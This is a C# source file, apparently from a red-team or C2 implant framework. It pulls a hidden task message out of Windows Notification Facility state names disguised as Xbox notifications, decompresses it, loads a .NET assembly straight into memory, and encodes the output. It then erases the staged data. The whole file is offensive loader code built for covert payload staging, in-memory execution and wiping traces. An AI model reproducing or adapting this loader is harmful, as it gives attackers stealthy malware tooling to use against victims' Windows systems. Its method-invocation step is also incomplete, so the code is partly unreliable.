using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.IO.Pipes;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Web.Script.Serialization;

public class InjectionLoaderWnf
{
    public static void LoadRP()
    {
        try
        {   
            TaskMsg task = GetTaskWnf();

            StringBuilder myb = new StringBuilder();
            StringWriter sw = new StringWriter(myb);
            TextWriter oldOut = Console.Out;
            Console.SetOut(sw);
            Console.SetError(sw);

            string classname = task.ModuleTask.Moduleclass;
            string assembly = task.ModuleTask.Assembly;
            string method = task.ModuleTask.Method;
            string[] paramsv = task.ModuleTask.Parameters;
            RunAssembly(assembly, classname, method, new object[] { paramsv });

            string output = myb.ToString();

            Console.SetOut(oldOut);
            Console.SetError(oldOut);
            sw.Flush();
            sw.Close();

            Console.WriteLine(Convert.ToBase64String(Encoding.Default.GetBytes(output)));

            Environment.Exit(0);
        }
        catch (Exception e)
        {
            Console.WriteLine("[x] error " + e.Message);
            Console.WriteLine("[x] error " + e.StackTrace);
        }
    }


    public static void RunAssembly(string resname, string type, string method, object[] args)
    {

        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(getPayload(resname));
        Type assemblyType = assembly.GetType(type);
        object assemblyObject = Activator.CreateInstance(assemblyType);

    }

    public static TaskMsg GetTaskWnf()
    {

        var casper = new byte[0];
        TaskMsg task = new TaskMsg(); 

        if (QueryWnf(Natives.WNF_XBOX_STORAGE_CHANGED).Data.Length > 0)
        {
            var p1_compressed = QueryWnf(Natives.PART_1).Data;
            var p2_compressed = QueryWnf(Natives.PART_2).Data;
            var p3_compressed = QueryWnf(Natives.PART_3).Data;
            var p4_compressed = QueryWnf(Natives.PART_4).Data;

            var part1 = DecompressDLL(p1_compressed);
            var part2 = DecompressDLL(p2_compressed);
            var part3 = DecompressDLL(p3_compressed);
            var part4 = DecompressDLL(p4_compressed);

            var s = new MemoryStream();
            s.Write(part1, 0, part1.Length);
            s.Write(part2, 0, part2.Length);
            s.Write(part3, 0, part3.Length);
            s.Write(part4, 0, part4.Length);
            casper = s.ToArray();

            byte[] line = DecompressDLL(Convert.FromBase64String(Encoding.Default.GetString(casper)));

            try
            {
                task = new JavaScriptSerializer().Deserialize<TaskMsg>(Encoding.Default.GetString(line));
                
            }
            catch (Exception e)
            {
                Console.WriteLine("[*] Error: {0}", e.Message);
                Console.WriteLine("[*] Error: {0}", e.StackTrace);
            }

            try
            {
                RemoveData();
            }
            catch (Exception e)
            {
                Console.WriteLine("[*] Error: {0}", e.Message);
                Console.WriteLine("[*] Error: {0}", e.StackTrace);
            }
        }
        
        return task;

    }

    private static bool RemoveData()
    {
        if (QueryWnf(Natives.WNF_XBOX_STORAGE_CHANGED).Data.Length > 0)
        {
            UpdateWnf(Natives.PART_1, new byte[] { });
            UpdateWnf(Natives.PART_2, new byte[] { });
            UpdateWnf(Natives.PART_3, new byte[] { });
            UpdateWnf(Natives.PART_4, new byte[] { });
            UpdateWnf(Natives.WNF_XBOX_STORAGE_CHANGED, new byte[0] { });
        }

        return true;
    }

    public static int UpdateWnf(ulong state, byte[] data)
    {
        using (var buffer = data.ToBuffer())
        {
            ulong state_name = state;

            return Natives.ZwUpdateWnfStateData(ref state_name, buffer,
                buffer.Length, null, IntPtr.Zero, 0, false);
        }
    }

    public static Natives.WnfStateData QueryWnf(ulong state)
    {
        var data = new Natives.WnfStateData();
        int tries = 10;
        int size = 4096;
        while (tries-- > 0)
        {
            using (var buffer = new SafeHGlobalBuffer(size))
            {
                int status;
                status = Natives.ZwQueryWnfStateData(ref state, null, IntPtr.Zero, out int changestamp, buffer, ref size);

                if (status == 0xC0000023)
                    continue;
                data = new Natives.WnfStateData(changestamp, buffer.ReadBytes(size));
            }
        }
        return data;
    }

    public static byte[] getPayload(string payload)
    {
        return DecompressDLL(Convert.FromBase64String(payload));
    }

    public static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    public class ModuleConfig
    {
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class CommandConfig
    {
        public string Command { get; set; }
        public string[] Parameters { get; set; }
    }

    public class StandardConfig
    {
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class FileDownloadConfig
    {
        public string FileNameDest { get; set; }
        public string Moduleclass { get; set; }
        public string Method { get; set; }
        public string[] Parameters { get; set; }
        public string Assembly { get; set; }
    }

    public class TaskMsg
    {
        public string Agentid { get; set; }
        public string Instanceid { get; set; }
        public string AgentPivot { get; set; }
        public string TaskType { get; set; }
        public bool Chunked { get; set; }
        public int ChunkNumber { get; set; }
        public ModuleConfig ModuleTask { get; set; }
        public CommandConfig CommandTask { get; set; }
        public StandardConfig StandardTask { get; set; }
        public FileDownloadConfig DownloadTask { get; set; }
    }

    public class ResponseMsg
    {
        public string Agentid { get; set; }
        public string AgentPivot { get; set; }
        public string TaskInstanceid { get; set; }
        public bool Chunked { get; set; }
        public int Number { get; set; }
        public string Data { get; set; }
    }
}


// Original dev: James Forshaw @tyranid: Project Zero
// Ref: https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/46b95cba8f76fae9a5c8258d13057d5edfacdf90/NtApiDotNet/SafeHandles.cs
public class SafeHGlobalBuffer : SafeBuffer
{
    public SafeHGlobalBuffer(int length)
      : this(length, length) { }

    protected SafeHGlobalBuffer(int allocation_length, int total_length)
        : this(Marshal.AllocHGlobal(allocation_length), total_length, true) { }

    public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
      : base(owns_handle)
    {
        Length = length;
        Initialize((ulong)length);
        SetHandle(buffer);
    }


    public static SafeHGlobalBuffer Null { get { return new SafeHGlobalBuffer(IntPtr.Zero, 0, false); } }

    protected override bool ReleaseHandle()
    {
        if (!IsInvalid)
        {
            Marshal.FreeHGlobal(handle);
            handle = IntPtr.Zero;
        }
        return true;
    }

    public byte[] ReadBytes(ulong byte_offset, int count)
    {
        byte[] ret = new byte[count];
        ReadArray(byte_offset, ret, 0, count);
        return ret;
    }

    public byte[] ReadBytes(int count)
    {
        return ReadBytes(0, count);
    }

    public SafeHGlobalBuffer(byte[] data) : this(data.Length)
    {
        Marshal.Copy(data, 0, handle, data.Length);
    }

    public int Length
    {
        get; private set;
    }
}


static class BufferUtils
{
    public static SafeHGlobalBuffer ToBuffer(this byte[] value)
    {
        return new SafeHGlobalBuffer(value);
    }
}

public class Natives
{
    public const ulong PART_1 = 0x19890C35A3BEF075;
    public const ulong PART_2 = 0x19890C35A3BC6075;
    public const ulong PART_3 = 0x19890C35A3BEC075;
    public const ulong PART_4 = 0x19890C35A3BEF875; //A3BEF875 - 19890C35 WNF_XBOX_SETTINGS_RAW_NOTIFICATION_RECEIVED
    public const ulong WNF_XBOX_STORAGE_CHANGED = 0x19890C35A3BD6875;

    [StructLayout(LayoutKind.Sequential)]
    public class WnfType
    {
        public Guid TypeId;
    }

    public class WnfStateData
    {
        public int Changestamp { get; }
        public byte[] Data { get; }

        public WnfStateData() { }
        public WnfStateData(int changestamp, byte[] data)
        {
            Changestamp = changestamp;
            Data = data;
        }
    }

    [DllImport("ntdll.dll")]
    public static extern int ZwQueryWnfStateData(
        ref ulong StateId,
        [In, Optional] WnfType TypeId,
        [Optional] IntPtr Scope,
        out int Changestamp,
        SafeBuffer DataBuffer,
        ref int DataBufferSize
    );


    [DllImport("ntdll.dll")]
    public static extern int ZwUpdateWnfStateData(
        ref ulong StateId,
        SafeBuffer DataBuffer,
        int DataBufferSize,
        [In, Optional] WnfType TypeId,
        [Optional] IntPtr Scope,
        int MatchingChangestamp,
        [MarshalAs(UnmanagedType.Bool)] bool CheckChangestamp
    );

}

